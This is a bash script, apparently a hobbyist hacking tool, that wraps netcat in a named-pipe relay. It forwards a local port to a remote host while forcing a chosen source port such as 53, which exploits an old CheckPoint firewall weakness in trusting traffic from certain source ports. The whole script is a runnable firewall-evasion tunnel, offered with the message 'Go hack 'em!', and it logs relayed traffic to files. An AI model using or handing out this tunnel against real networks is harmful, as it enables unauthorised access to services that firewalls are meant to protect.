#!/usr/bin/env bash

#      _                                       _     _ _     _
#   __| | __ _  ___ _ __ ___   ___  _ __   ___| |__ (_) | __| |
#  / _` |/ _` |/ _ \ '_ ` _ \ / _ \| '_ \ / __| '_ \| | |/ _` |
# | (_| | (_| |  __/ | | | | | (_) | | | | (__| | | | | | (_| |
#  \__,_|\__,_|\___|_| |_| |_|\___/|_| |_|\___|_| |_|_|_|\__,_|
#

# Title:	  Source Port Tunneler - with NetCat
# Version:	1.0
# Purpose:	Wrapper to nc to create source port tunnels
#           Takes advantage of an old, old CheckPoint issue
# Requires: nc

# Usage:
#		  src_port_tunneler_nc.sh [sourceport] [remoteip] [remoteport] [localport]
#	    Eg: src_port_tunneler_nc.sh 53 10.1.2.3 22 8888, creates tunnel to port 22 via 8888

echo
echo "---- Source Port Tunneler ----"
echo "----    by daemonchild    ----"
echo

# There is no point continuing if we're not a superuser
USER=$(whoami)
if test "$USER" != "root" ; then
	echo "*** You need to run this script as root ***"
	echo
	exit 1
fi

# This program requires socat to be installed
NC=$(which nc)

if [ "$NC" == "" ] ; then

  echo "*** I couldn't find nc in the path ***"
	echo
	exit 1

fi

# Operating System Detection
MYOS=$(uname -s)

# Named Pipe
TIME=`date +'%H%M'`
PIPENAME=pipe-$TIME

# Set the IP address for the start of the tunnel
if test $MYOS == "Linux" ; then
	MYIPADDR=$(ifconfig | grep UP | cut -f 1 -d ":" | grep -v "lo0"| cut -f 2 -d ":" | cut -f 1 -d " ")
	mknod $PIPENAME p
fi

if test $MYOS == "Darwin" ; then
	MYIPADDR=$(ipconfig getifaddr en0)
	mkfifo $PIPENAME
fi

# OVERRIDE THE ABOVE IP Address setting
# Comment out or remove only if you know what you're risking
MYIPADDR="localhost"

# Test for parameters being passed to the script
if test -z "$1"; then

	echo "Usage: src_port_tunneler_nc.sh [sourceport] [remoteip] [remoteport] [localport]"
	echo "Eg: src_port_tunneler_nc.sh 53 10.1.2.3 22 8888, creates tunnel to port 22 via 8888"
	echo ""

# else process the parameters
else

	SPORT=$1
	IP=$2
	RPORT=$3
	LPORT=$4

	echo "Creating Tunnel: [$MYIPADDR:$LPORT] --SP:$SPORT--> [$IP:$RPORT]"
	echo ""
	echo "I am running: nc -l $LPORT 0<$PIPENAME | tee -a inflow | nc -p $SPORT $IP $RPORT| tee -a outflow 1>$PIPENAME"
  if [ "$(which cowsay)" ] ; then cowsay "What are you waiting for? Go hack 'em!" ; fi
  echo ""
  echo "Waiting for tunnel input - hint, connect to $MYIPADDR:$LPORT with something..."

	nc -l $LPORT 0<$PIPENAME | tee -a inflow | nc -p $SPORT $IP $RPORT| tee -a outflow 1>$PIPENAME

fi